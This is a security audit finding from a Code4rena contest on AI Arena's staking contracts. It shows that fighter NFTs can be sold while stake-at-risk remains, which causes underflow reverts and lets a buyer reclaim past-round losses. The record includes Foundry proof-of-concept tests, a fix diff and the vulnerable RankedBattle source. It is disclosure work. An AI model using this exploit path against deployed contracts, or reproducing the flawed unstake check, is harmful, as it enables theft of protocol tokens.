{
  "Title": "[M-06] NFTs can be transferred even if StakeAtRisk remains, so the user's win cannot be recorded on the chain due to underflow, and can recover past losses that can't be recovered (steal protocol's token)",
  "Content": "\n<https://github.com/code-423n4/2024-02-ai-arena/blob/1d18d1298729e443e14fea08149c77182a65da32/src/RankedBattle.sol#L285-L286><br>\n<https://github.com/code-423n4/2024-02-ai-arena/blob/1d18d1298729e443e14fea08149c77182a65da32/src/RankedBattle.sol#L495-L496>\n\nCannot record a user's victory on-chain, and it may be possible to recover past losses (which should impossible).\n\n### Proof of Concept\n\nIf you lose in a game, `_addResultPoints` is called, and the staked tokens move to the StakeAtRisk.\n\n<details>\n\n```solidity\nfunction _addResultPoints(\n    uint8 battleResult, \n    uint256 tokenId, \n    uint256 eloFactor, \n    uint256 mergingPortion,\n    address fighterOwner\n) \n    private \n{\n    uint256 stakeAtRisk;\n    uint256 curStakeAtRisk;\n    uint256 points = 0;\n\n    /// Check how many NRNs the fighter has at risk\n    stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);\n    ...\n\n    /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract\n@>  curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;\n    if (battleResult == 0) {\n        /// If the user won the match\n        ...\n    } else if (battleResult == 2) {\n        /// If the user lost the match\n\n        /// Do not allow users to lose more NRNs than they have in their staking pool\n        if (curStakeAtRisk > amountStaked[tokenId]) {\n@>          curStakeAtRisk = amountStaked[tokenId];\n        }\n        if (accumulatedPointsPerFighter[tokenId][roundId] > 0) {\n            ...\n        } else {\n            /// If the fighter does not have any points for this round, NRNs become at risk of being lost\n@>          bool success = _neuronInstance.transfer(_stakeAtRiskAddress, curStakeAtRisk);\n            if (success) {\n@>              _stakeAtRiskInstance.updateAtRiskRecords(curStakeAtRisk, tokenId, fighterOwner);\n@>              amountStaked[tokenId] -= curStakeAtRisk;\n            }\n        }\n    }\n}\n```\n</details>\n\nIf a Fighter NFT has NRN tokens staked, that Fighter NFT is locked and cannot be transfered. When the tokens are unstaked and the remaining `amountStaked[tokenId]` becomes 0, the Fighter NFT is unlocked and it can be transfered. However, it does not check whether there are still tokens in the StakeAtRisk of the Fighter NFT.\n\n<details>\n\n```solidity\nfunction unstakeNRN(uint256 amount, uint256 tokenId) external {\n    require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, \"Caller does not own fighter\");\n    if (amount > amountStaked[tokenId]) {\n@>      amount = amountStaked[tokenId];\n    }\n    amountStaked[tokenId] -= amount;\n    globalStakedAmount -= amount;\n    stakingFactor[tokenId] = _getStakingFactor(\n        tokenId, \n        _stakeAtRiskInstance.getStakeAtRisk(tokenId)\n    );\n    _calculatedStakingFactor[tokenId][roundId] = true;\n    hasUnstaked[tokenId][roundId] = true;\n    bool success = _neuronInstance.transfer(msg.sender, amount);\n    if (success) {\n        if (amountStaked[tokenId] == 0) {\n@>          _fighterFarmInstance.updateFighterStaking(tokenId, false);\n        }\n        emit Unstaked(msg.sender, amount);\n    }\n}\n```\n</details>\n\nUnstaked Fighter NFTs can now be traded on the secondary market. Suppose another user buys this Fighter NFT with remaining StakeAtRisk.\n\nNormally, if you win a game, you can call `reclaimNRN` to get the tokens back from StakeAtRisk.\n\n<details>\n\n```solidity\nfunction _addResultPoints(\n    uint8 battleResult, \n    uint256 tokenId, \n    uint256 eloFactor, \n    uint256 mergingPortion,\n    address fighterOwner\n) \n    private \n{\n    uint256 stakeAtRisk;\n    uint256 curStakeAtRisk;\n    uint256 points = 0;\n\n    /// Check how many NRNs the fighter has at risk\n@>  stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);\n\n    ...\n    /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract\n@>  curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;\n    if (battleResult == 0) {\n        /// If the user won the match\n        ...\n\n        /// Do not allow users to reclaim more NRNs than they have at risk\n        if (curStakeAtRisk > stakeAtRisk) {\n@>          curStakeAtRisk = stakeAtRisk;\n        }\n\n        /// If the user has stake-at-risk for their fighter, reclaim a portion\n        /// Reclaiming stake-at-risk puts the NRN back into their staking pool\n@>      if (curStakeAtRisk > 0) {\n@>          _stakeAtRiskInstance.reclaimNRN(curStakeAtRisk, tokenId, fighterOwner);\n            amountStaked[tokenId] += curStakeAtRisk;\n        }\n        ...\n    } else if (battleResult == 2) {\n        ...\n    }\n}\n```\n</details>\n\nHowever, if a new user becomes the owner of the Fighter NFT, it does not work as intended.\n\nThe `_addResultPoints` might revert due to the underflow at `reclaimNRN`'s `amountLost[fighterOwner] -= nrnToReclaim`. Therefore, the new owner cannot record a victory on-chain with the purchased NFT until the end of this round.\n\n```solidity\nfunction getStakeAtRisk(uint256 fighterId) external view returns(uint256) {\n@>  return stakeAtRisk[roundId][fighterId];\n}\n\nfunction reclaimNRN(uint256 nrnToReclaim, uint256 fighterId, address fighterOwner) external {\n    require(msg.sender == _rankedBattleAddress, \"Call must be from RankedBattle contract\");\n    require(\n        stakeAtRisk[roundId][fighterId] >= nrnToReclaim, \n        \"Fighter does not have enough stake at risk\"\n    );\n\n    bool success = _neuronInstance.transfer(_rankedBattleAddress, nrnToReclaim);\n    if (success) {\n        stakeAtRisk[roundId][fighterId] -= nrnToReclaim;\n        totalStakeAtRisk[roundId] -= nrnToReclaim;\n@>      amountLost[fighterOwner] -= nrnToReclaim;\n        emit ReclaimedStake(fighterId, nrnToReclaim);\n    }\n}\n```\n\nEven if the new owner already has another NFT and has a sufficient amount of `amountLost[fighterOwner]`, there is a problem.\n\n*   Alice buy the NFT2(tokenId 2) from the secondary market, which has 30 stakeAtRisk.\n    *   stakeAtRisk of NFT2: 30\n    *   amountLost: 0\n*   Alice also owns the NFT1(tokenId 1) and has 100 stakeAtRisk in the same round.\n    *   stakeAtRisk of NFT1: 100\n    *   stakeAtRisk of NFT2: 30\n    *   amountLost: 100\n*   Alice wins with the NFT2 and reclaims 30 stakeAtRisk.\n    *   stakeAtRisk of NFT1: 100\n    *   stakeAtRisk of NFT2: 0\n    *   amountLost: 70\n*   If Alice tries to reclaim stakeAtRisk of NFT1, an underflow occurs and it reverts when remaining stakeAtRisk is 30.\n    *   stakeAtRisk of NFT1: 30\n    *   stakeAtRisk of NFT2: 0\n    *   amountLost: 0\n*   Alice will no longer be able to record a win for NFT1 due to underflow.\n\nThere is a problem even if the user owns a sufficient amount of `amountLost[fighterOwner]` and does not have stakeAtRisk of another NFT in the current round. In this case, the user can steal the protocol's token.\n\n*   Alice owns NFT1 and had 100 stakeAtRisk with NFT1 at past round.\n    *   Since the round has already passed, this loss of 100 NRN is a past loss that can no longer be recovered.\n    *   Since `amountLost[fighterOwner]` is a total amount regardless of rounds, it remains 100 even after the round.\n    *   stakeAtRisk of NFT1: 0 (current round)\n    *   amountLost: 100 (this should be unrecoverable)\n*   Alice buys NFT 2 from the secondary market, which has 100 stakeAtRisk.\n    *   stakeAtRisk of NFT1: 0\n    *   stakeAtRisk of NFT2: 100\n    *   amountLost: 100\n*   Alice wins with NFT 2 and reclaims 100.\n    *   stakeAtRisk of NFT1: 0\n    *   stakeAtRisk of NFT2: 0\n    *   amountLost: 0\n*   Alice recovers the past loss through NFT 2. Alice recovered past lost, which shouldn't be recovered, which means she steals the protocol's token.\n\nThis is PoC. You can add it to StakeAtRisk.t.sol and run it.\n\n*   testPoC1 shows that a user with `amountLost` 0 cannot record a victory with the purchased NFT due to underflow.\n*   testPoC2 shows that a user who already has stakeAtRisk due to another NFT in the same round can no longer record a win due to underflow.\n*   testPoC3 shows that a user can recover losses from a past round by using a purchased NFT.\n\n<details>\n\n```solidity\nfunction testPoC1() public {\n    address seller = vm.addr(3);\n    address buyer = vm.addr(4);\n    \n    uint256 stakeAmount = 3_000 * 10 ** 18;\n    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;\n    _mintFromMergingPool(seller);\n    uint256 tokenId = 0;\n    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);\n    _fundUserWith4kNeuronByTreasury(seller);\n    vm.prank(seller);\n    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);\n    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    // loses battle\n    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);\n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), expectedStakeAtRiskAmount);\n\n    // seller unstake and sell NFT to buyer\n    vm.startPrank(seller);\n    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);\n    _fighterFarmContract.transferFrom(seller, buyer, tokenId);\n    vm.stopPrank();\n\n    // The buyer win battle but cannot write at onchain\n    vm.expectRevert(abi.encodeWithSignature(\"Panic(uint256)\", 0x11)); // expect arithmeticError (underflow)\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, true);\n\n}\n\nfunction testPoC2() public {\n    address seller = vm.addr(3);\n    address buyer = vm.addr(4);\n    \n    uint256 stakeAmount = 3_000 * 10 ** 18;\n    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;\n    _mintFromMergingPool(seller);\n    uint256 tokenId = 0;\n    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);\n    _fundUserWith4kNeuronByTreasury(seller);\n    vm.prank(seller);\n    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);\n    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    // loses battle\n    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);\n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), expectedStakeAtRiskAmount);\n\n    // seller unstake and sell NFT to buyer\n    vm.startPrank(seller);\n    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);\n    _fighterFarmContract.transferFrom(seller, buyer, tokenId);\n    vm.stopPrank();\n\n    // The buyer have new NFT and loses with it\n    uint256 stakeAmount_buyer = 3_500 * 10 ** 18;\n    uint256 expectedStakeAtRiskAmount_buyer = (stakeAmount_buyer * 100) / 100000;\n\n    _mintFromMergingPool(buyer);\n    uint256 tokenId_buyer = 1;\n    assertEq(_fighterFarmContract.ownerOf(tokenId_buyer), buyer);\n\n    _fundUserWith4kNeuronByTreasury(buyer);\n    vm.prank(buyer);\n    _rankedBattleContract.stakeNRN(stakeAmount_buyer, tokenId_buyer);\n    assertEq(_rankedBattleContract.amountStaked(tokenId_buyer), stakeAmount_buyer);\n\n    // buyer loses with tokenId_buyer\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 2, 1500, true);\n    \n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer);\n    assertGt(expectedStakeAtRiskAmount_buyer, expectedStakeAtRiskAmount, \"buyer has more StakeAtRisk\");\n\n    // buyer win with bought NFT (tokenId 0)\n    vm.startPrank(address(_GAME_SERVER_ADDRESS));\n    for(uint256 i = 0; i < 1000; i++){\n        _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);\n    }\n    vm.stopPrank();\n\n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), 0); // Reclaimed all stakeAtRisk of bought NFT(token 0)\n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer); // tokenId_buyer stakeAtRisk remains\n    assertEq(_stakeAtRiskContract.amountLost(buyer), expectedStakeAtRiskAmount_buyer - expectedStakeAtRiskAmount, \"remain StakeAtRisk\");\n\n    // the remain StakeAtRisk cannot be reclaimed even if buyer win with tokenId_buyer(token 1)\n    // and the win result of token 1 cannot be saved at onchain\n    vm.expectRevert(abi.encodeWithSignature(\"Panic(uint256)\", 0x11)); // expect arithmeticError (underflow)\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 0, 1500, false);\n}\n\nfunction testPoC3() public {\n    address seller = vm.addr(3);\n    address buyer = vm.addr(4);\n    \n    uint256 stakeAmount = 3_000 * 10 ** 18;\n    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;\n\n    // The buyer have new NFT and loses with it\n    uint256 stakeAmount_buyer = 300 * 10 ** 18;\n    uint256 expectedStakeAtRiskAmount_buyer = (stakeAmount_buyer * 100) / 100000;\n\n    _mintFromMergingPool(buyer);\n    uint256 tokenId_buyer = 0;\n    assertEq(_fighterFarmContract.ownerOf(tokenId_buyer), buyer);\n\n    _fundUserWith4kNeuronByTreasury(buyer);\n    vm.prank(buyer);\n    _rankedBattleContract.stakeNRN(stakeAmount_buyer, tokenId_buyer);\n    assertEq(_rankedBattleContract.amountStaked(tokenId_buyer), stakeAmount_buyer);\n\n    // buyer loses with tokenId_buyer\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 2, 1500, true);\n\n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer);\n    assertGt(expectedStakeAtRiskAmount, expectedStakeAtRiskAmount_buyer, \"seller's token has more StakeAtRisk\");\n\n    // round 0 passed\n    // tokenId_buyer's round 0 StakeAtRisk is reset\n    vm.prank(address(_rankedBattleContract));\n    _stakeAtRiskContract.setNewRound(1);\n    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId_buyer), 0);\n\n    // seller mint token, lose battle and sell the NFT\n    _mintFromMergingPool(seller);\n    uint256 tokenId = 1;\n    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);\n    _fundUserWith4kNeuronByTreasury(seller);\n    vm.prank(seller);\n    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);\n    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    // loses battle\n    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);\n    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId), expectedStakeAtRiskAmount);\n\n    // seller unstake and sell NFT to buyer\n    vm.startPrank(seller);\n    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);\n    _fighterFarmContract.transferFrom(seller, buyer, tokenId);\n    vm.stopPrank();\n\n    \n    // buyer win with bought NFT (tokenId 0)\n    vm.startPrank(address(_GAME_SERVER_ADDRESS));\n    for(uint256 i = 0; i < 100; i++){\n        _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);\n    }\n    vm.stopPrank();\n\n    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId), expectedStakeAtRiskAmount - expectedStakeAtRiskAmount_buyer); // Reclaimed all stakeAtRisk of bought NFT(token 1)\n    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId_buyer), 0);\n    assertEq(_stakeAtRiskContract.amountLost(buyer), 0, \"reclaimed old lost\");\n\n    // and the win result of token 1 cannot be saved at onchain anymore\n    vm.expectRevert(abi.encodeWithSignature(\"Panic(uint256)\", 0x11)); // expect arithmeticError (underflow)\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);\n\n}\n```\n</details>\n\n### Recommended Mitigation Steps\n\nTokens with a remaining StakeAtRisk should not be allowed to be exchanged.\n\n```diff\nfunction unstakeNRN(uint256 amount, uint256 tokenId) external {\n    require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, \"Caller does not own fighter\");\n    if (amount > amountStaked[tokenId]) {\n        amount = amountStaked[tokenId];\n    }\n    amountStaked[tokenId] -= amount;\n    globalStakedAmount -= amount;\n    stakingFactor[tokenId] = _getStakingFactor(\n        tokenId, \n        _stakeAtRiskInstance.getStakeAtRisk(tokenId)\n    );\n    _calculatedStakingFactor[tokenId][roundId] = true;\n    hasUnstaked[tokenId][roundId] = true;\n    bool success = _neuronInstance.transfer(msg.sender, amount);\n    if (success) {\n-       if (amountStaked[tokenId] == 0) {\n+       if (amountStaked[tokenId] == 0 && _stakeAtRiskInstance.getStakeAtRisk(tokenId) == 0) {\n            _fighterFarmInstance.updateFighterStaking(tokenId, false);\n        }\n        emit Unstaked(msg.sender, amount);\n    }\n}\n```\n\n**[hickuphh3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/137#issuecomment-1996612817):**\n > See comment on this vulnerability in the initial primary issue [#1641](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1641#issuecomment-1990163424).\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/137#issuecomment-2003974918)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/9\n\n**Status:** Not fully mitigated. Full details in report from [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/51), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-02-ai-arena",
  "Code": [
    {
      "filename": "src/RankedBattle.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0 <0.9.0;\n\nimport { FighterFarm } from \"./FighterFarm.sol\";\nimport { VoltageManager } from \"./VoltageManager.sol\";\nimport { MergingPool } from \"./MergingPool.sol\";\nimport { Neuron } from \"./Neuron.sol\";\nimport { StakeAtRisk } from \"./StakeAtRisk.sol\";\nimport { FixedPointMathLib } from './FixedPointMathLib.sol';\n\n/// @title RankedBattle\n/// @author ArenaX Labs Inc.\n/// @notice This contract provides functionality for staking NRN tokens on fighters, \n/// tracking battle records, calculating and distributing rewards based on battle outcomes \n/// and staked amounts, and allowing claiming of accumulated rewards.\ncontract RankedBattle {\n\n    /// @dev Extend functionality of the FixedPointMathLib library to the uint data type.\n    using FixedPointMathLib for uint;\n\n    /*//////////////////////////////////////////////////////////////\n                                EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Event emitted when staked.\n    event Staked(address from, uint256 amount);\n\n    /// @notice Event emitted when unstaked.\n    event Unstaked(address from, uint256 amount);\n\n    /// @notice Event emitted when claimed.\n    event Claimed(address claimer, uint256 amount);\n\n    /// @notice Event emitted when points are added or subtracted from a fighter.\n    event PointsChanged(uint256 tokenId, uint256 points, bool increased);    \n\n    /*//////////////////////////////////////////////////////////////\n                                STRUCTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Struct for battle record.\n    struct BattleRecord {\n        uint32 wins;\n        uint32 ties;\n        uint32 loses;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            STATE VARIABLES\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Voltage cost per match initiated\n    uint8 public constant VOLTAGE_COST = 10;\n\n    /// @notice Number of total battles.\n    uint256 public totalBattles = 0;\n\n    /// @notice Number of overall staked amount.\n    uint256 public globalStakedAmount = 0;\n\n    /// @notice Current round number.\n    uint256 public roundId = 0;\n\n    /// @notice Amount of basis points that get taken away from a player's stake when they lose in \n    /// a point deficit.\n    uint256 public bpsLostPerLoss = 10;\n\n    /// The StakeAtRisk contract address.\n    address _stakeAtRiskAddress;\n\n    /// The address that has owner privileges (initially the contract deployer).\n    address _ownerAddress;\n\n    /// @notice The address in charge of updating battle records.\n    address _gameServerAddress;\n\n    /*//////////////////////////////////////////////////////////////\n                            CONTRACT INSTANCES\n    //////////////////////////////////////////////////////////////*/ \n\n    /// @notice The neuron contract instance.\n    Neuron _neuronInstance;\n\n    /// @notice The fighter farm contract instance.\n    FighterFarm _fighterFarmInstance;\n\n    /// @notice The voltage manager contract instance.\n    VoltageManager _voltageManagerInstance;\n\n    /// @notice The merging pool contract instance.\n    MergingPool _mergingPoolInstance;\n\n    /// @notice The stake at risk contract instance.\n    StakeAtRisk _stakeAtRiskInstance;\n\n    /*//////////////////////////////////////////////////////////////\n                                MAPPINGS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Maps addresses that are admins.\n    mapping(address => bool) public isAdmin;\n\n    /// @notice Mapping of token id to battle record struct.\n    mapping(uint256 => BattleRecord) public fighterBattleRecord;\n\n    /// @notice Mapping of address to the amount of NRNs they have claimed.\n    mapping(address => uint256) public amountClaimed;\n\n    /// @notice Maps the user address to the number of rounds they've claimed for\n    mapping(address => uint32) public numRoundsClaimed;\n\n    /// @notice Maps address to round ID to track accumulated points.\n    mapping(address => mapping(uint256 => uint256)) public accumulatedPointsPerAddress;\n\n    /// @notice Maps token ID to round ID to track accumulated points.\n    mapping(uint256 => mapping(uint256 => uint256)) public accumulatedPointsPerFighter;\n\n    /// @notice Maps round ID to total accumulated points.\n    mapping(uint256 => uint256) public totalAccumulatedPoints;\n\n    /// @notice Mapping of roundID to nrn distribution amount for a ranked period.\n    mapping(uint256 => uint256) public rankedNrnDistribution;\n\n    /// @notice Maps the token ID to the round ID and indicates whether it is Unstaked or not.\n    mapping(uint256 => mapping(uint256 => bool)) public hasUnstaked;\n\n    /// @notice Mapping of token id to staked amount.\n    mapping(uint256 => uint256) public amountStaked;\n\n    /// @notice Mapping of token id to staking factor.\n    mapping(uint256 => uint256) public stakingFactor;\n\n    /// @notice Indicates whether we have calculated the staking factor for a given round and token.\n    mapping(uint256 => mapping(uint256 => bool)) _calculatedStakingFactor;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Initializes the contract by setting various addresses and instantiating \n    /// contract instances. It also designates the owner address as an admin. \n    /// @param ownerAddress Address of contract deployer.\n    /// @param gameServerAddress The game server address.\n    /// @param fighterFarmAddress Address of the FighterFarm contract.\n    /// @param voltageManagerAddress Address of the VoltageManager contract.\n    constructor(\n      address ownerAddress, \n      address gameServerAddress,\n      address fighterFarmAddress,\n      address voltageManagerAddress\n    ) {\n        _ownerAddress = ownerAddress;\n        _gameServerAddress = gameServerAddress;\n        _fighterFarmInstance = FighterFarm(fighterFarmAddress);\n        _voltageManagerInstance = VoltageManager(voltageManagerAddress);\n        isAdmin[_ownerAddress] = true;\n        rankedNrnDistribution[0] = 5000 * 10**18;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            EXTERNAL FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Transfers ownership from one address to another.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param newOwnerAddress The address of the new owner\n    function transferOwnership(address newOwnerAddress) external {\n        require(msg.sender == _ownerAddress);\n        _ownerAddress = newOwnerAddress;\n    }\n\n    /// @notice Adjusts admin access for a user.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param adminAddress The address of the admin.\n    /// @param access Whether the address has admin access or not.\n    function adjustAdminAccess(address adminAddress, bool access) external {\n        require(msg.sender == _ownerAddress);\n        isAdmin[adminAddress] = access;\n    }  \n\n    /// @notice Sets the game server address.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param gameServerAddress The game server address.\n    function setGameServerAddress(address gameServerAddress) external {\n        require(msg.sender == _ownerAddress);\n        _gameServerAddress = gameServerAddress;\n    }\n\n    /// @notice Sets the Stake at Risk contract address and instantiates the contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param stakeAtRiskAddress The address of the Stake At Risk contract.\n    function setStakeAtRiskAddress(address stakeAtRiskAddress) external {\n        require(msg.sender == _ownerAddress);\n        _stakeAtRiskAddress = stakeAtRiskAddress;\n        _stakeAtRiskInstance = StakeAtRisk(_stakeAtRiskAddress);\n    }\n\n    /// @notice Instantiates the neuron contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param nrnAddress The address of the Neuron contract.\n    function instantiateNeuronContract(address nrnAddress) external {\n        require(msg.sender == _ownerAddress);\n        _neuronInstance = Neuron(nrnAddress);\n    }\n\n    /// @notice Instantiates the merging pool contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param mergingPoolAddress The address of the MergingPool contract.\n    function instantiateMergingPoolContract(address mergingPoolAddress) external {\n        require(msg.sender == _ownerAddress);\n        _mergingPoolInstance = MergingPool(mergingPoolAddress);\n    }\n\n    /// @notice Sets the ranked nrn distribution amount for the current round.\n    /// @dev Only admins are authorized to change the ranked NRN distribution.\n    /// @dev newDistribution is NOT denominated in wei. As such, it is multiplied by 10**18.\n    /// @param newDistribution The new distribution amount.\n    function setRankedNrnDistribution(uint256 newDistribution) external {\n        require(isAdmin[msg.sender]);\n        rankedNrnDistribution[roundId] = newDistribution * 10**18;\n    }\n\n    /// @notice Sets the basis points lost per ranked match lost while in a point deficit.\n    /// @dev Only admins are authorized to call this function.\n    /// @param bpsLostPerLoss_ The basis points lost per loss.\n    function setBpsLostPerLoss(uint256 bpsLostPerLoss_) external {\n        require(isAdmin[msg.sender]);\n        bpsLostPerLoss = bpsLostPerLoss_;\n    }\n\n    /// @notice Sets a new round, making claiming available for that round.\n    /// @dev Only admins are authorized to move the round forward.\n    function setNewRound() external {\n        require(isAdmin[msg.sender]);\n        require(totalAccumulatedPoints[roundId] > 0);\n        roundId += 1;\n        _stakeAtRiskInstance.setNewRound(roundId);\n        rankedNrnDistribution[roundId] = rankedNrnDistribution[roundId - 1];\n    }\n\n    /// @notice Stakes NRN tokens.\n    /// @param amount The amount of NRN tokens to stake.\n    /// @param tokenId The ID of the fighter to stake.\n    function stakeNRN(uint256 amount, uint256 tokenId) external {\n        require(amount > 0, \"Amount cannot be 0\");\n        require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, \"Caller does not own fighter\");\n        require(_neuronInstance.balanceOf(msg.sender) >= amount, \"Stake amount exceeds balance\");\n        require(hasUnstaked[tokenId][roundId] == false, \"Cannot add stake after unstaking this round\");\n\n        _neuronInstance.approveStaker(msg.sender, address(this), amount);\n        bool success = _neuronInstance.transferFrom(msg.sender, address(this), amount);\n        if (success) {\n            if (amountStaked[tokenId] == 0) {\n                _fighterFarmInstance.updateFighterStaking(tokenId, true);\n            }\n            amountStaked[tokenId] += amount;\n            globalStakedAmount += amount;\n            stakingFactor[tokenId] = _getStakingFactor(\n                tokenId, \n                _stakeAtRiskInstance.getStakeAtRisk(tokenId)\n            );\n            _calculatedStakingFactor[tokenId][roundId] = true;\n            emit Staked(msg.sender, amount);\n        }\n    }\n\n    /// @notice Unstakes NRN tokens.\n    /// @param amount The amount of NRN tokens to unstake.\n    /// @param tokenId The ID of the token to unstake.\n    function unstakeNRN(uint256 amount, uint256 tokenId) external {\n        require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, \"Caller does not own fighter\");\n        if (amount > amountStaked[tokenId]) {\n            amount = amountStaked[tokenId];\n        }\n        amountStaked[tokenId] -= amount;\n        globalStakedAmount -= amount;\n        stakingFactor[tokenId] = _getStakingFactor(\n            tokenId, \n            _stakeAtRiskInstance.getStakeAtRisk(tokenId)\n        );\n        _calculatedStakingFactor[tokenId][roundId] = true;\n        hasUnstaked[tokenId][roundId] = true;\n        bool success = _neuronInstance.transfer(msg.sender, amount);\n        if (success) {\n            if (amountStaked[tokenId] == 0) {\n                _fighterFarmInstance.updateFighterStaking(tokenId, false);\n            }\n            emit Unstaked(msg.sender, amount);\n        }\n    }\n\n    /// @notice Claims NRN tokens for the specified rounds.\n    /// @dev Caller can only claim once per round.\n    function claimNRN() external {\n        require(numRoundsClaimed[msg.sender] < roundId, \"Already claimed NRNs for this period\");\n        uint256 claimableNRN = 0;\n        uint256 nrnDistribution;\n        uint32 lowerBound = numRoundsClaimed[msg.sender];\n        for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {\n            nrnDistribution = getNrnDistribution(currentRound);\n            claimableNRN += (\n                accumulatedPointsPerAddress[msg.sender][currentRound] * nrnDistribution   \n            ) / totalAccumulatedPoints[currentRound];\n            numRoundsClaimed[msg.sender] += 1;\n        }\n        if (claimableNRN > 0) {\n            amountClaimed[msg.sender] += claimableNRN;\n            _neuronInstance.mint(msg.sender, claimableNRN);\n            emit Claimed(msg.sender, claimableNRN);\n        }\n    }\n\n    /// @notice Updates the battle record for a fighter.\n    /// @dev Only the game server address is authorized to update the battle record.\n    /// @dev Only the fighter that initiates the battle expends voltage on the match.\n    /// @dev Only fighters that have NRN staked are able to earn points.\n    /// @param tokenId The ID of the fighter.\n    /// @param mergingPortion The portion of points that get redirected to the merging pool.\n    /// @param battleResult The result of the battle.\n    /// @param eloFactor Multiple derived from ELO to be applied to the base points earned.\n    /// @param initiatorBool Whether this was the fighter that initiated the battle or not\n    function updateBattleRecord(\n        uint256 tokenId, \n        uint256 mergingPortion,\n        uint8 battleResult,\n        uint256 eloFactor,\n        bool initiatorBool\n    ) \n        external \n    {   \n        require(msg.sender == _gameServerAddress);\n        require(mergingPortion <= 100);\n        address fighterOwner = _fighterFarmInstance.ownerOf(tokenId);\n        require(\n            !initiatorBool ||\n            _voltageManagerInstance.ownerVoltageReplenishTime(fighterOwner) <= block.timestamp || \n            _voltageManagerInstance.ownerVoltage(fighterOwner) >= VOLTAGE_COST\n        );\n\n        _updateRecord(tokenId, battleResult);\n        uint256 stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);\n        if (amountStaked[tokenId] + stakeAtRisk > 0) {\n            _addResultPoints(battleResult, tokenId, eloFactor, mergingPortion, fighterOwner);\n        }\n        if (initiatorBool) {\n            